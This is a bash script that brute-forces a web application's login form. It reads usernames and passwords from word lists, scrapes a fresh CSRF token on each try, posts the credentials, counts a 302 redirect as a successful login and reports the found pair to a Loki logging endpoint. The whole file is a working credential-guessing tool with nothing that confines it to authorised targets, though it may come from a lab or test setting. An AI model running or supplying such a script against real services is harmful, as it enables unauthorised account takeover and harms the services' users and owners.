#!/bin/bash

test-credentials() {
    local username="$1"
    local password="$2"
    local host="$3"
    local elapsed=0
    local TIMEOUT_SECONDS=7
    local SLEEP_INTERVAL=2

    while true; do
        # 1. Get token
        curl -c cookies.txt -s "${host}/login" -o login.html
        CSRF_TOKEN=$(grep 'csrf_token' login.html | awk -F"value='" '{print $2}' | awk -F"'" '{print $1}')

        # 2. Attempt Login
        HTTP_CODE=$(curl -b cookies.txt -s -o /dev/null -w "%{http_code}\n" "${host}/login" \
          -X POST \
          -H "Origin: ${host}" \
          -H "Referer: ${host}/login" \
          --data-raw "username=${username}&csrf_token=${CSRF_TOKEN}&password=${password}")

        case "${HTTP_CODE}" in
            200)  
                return 0
                ;;
            302)
                # This goes to stdout, so it gets caught by RESULT=
                echo "${username}:${password}"
                return 0
                ;;
            000)
                if (( elapsed >= TIMEOUT_SECONDS )); then
                    # FIXED: Correct stderr redirection
                    echo "DEBUG: Timeout reached" >&2 
                    smoloki "{\"job\":\"test\",\"level\":\"info\", \"host\":\"${host}\"}" "{\"message\":\"Timeout reached (${TIMEOUT_SECONDS}s).\"}"
                    return 1 # Return 1 so the main loop knows to exit
                fi
                
                echo "Waiting for service... (${elapsed}s)" >&2
                sleep "${SLEEP_INTERVAL}"
                ((elapsed+=SLEEP_INTERVAL))
                # The loop continues and runs 'curl' again
                ;;
            *)  
                echo "Unmanaged HTTP code: ${HTTP_CODE}" >&2
                return 1
                ;;
        esac
    done
}

# ------------- MAIN ------------- #
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <host> <loki-endpoint>"
    exit 1
fi  


HOST="$1"
export SMOLOKI_BASE_ENDPOINT="$2"


while IFS= read -r USERNAME || [[ -n "$USERNAME" ]]; do
    while IFS= read -r PASSWORD || [[ -n "$PASSWORD" ]]; do
        printf "testing ${USERNAME}:${PASSWORD} on ${HOST}\n"
        
        # Capture the output
        RESULT=$(test-credentials "${USERNAME}" "${PASSWORD}" "${HOST}")
        
        # Check if the function exited with an error (exit 1)
        if [ $? -eq 1 ]; then
            echo "Child process signaled a fatal error. Exiting." >&2
            exit 1
        fi

        if [[ -n "$RESULT" ]]; then
            smoloki "{\"job\":\"test\",\"level\":\"info\", \"host\":\"${HOST}\"}" "{\"message\":\"${RESULT} found in ${SECONDS}s\"}"
            exit 0
        fi
    done < passwords.txt
done < usernames.txt
smoloki "{\"job\":\"test\",\"level\":\"info\", \"host\":\"${HOST}\"}" "{\"message\":\"No match was found. Searched took ${SECONDS}s\"}"
exit 0
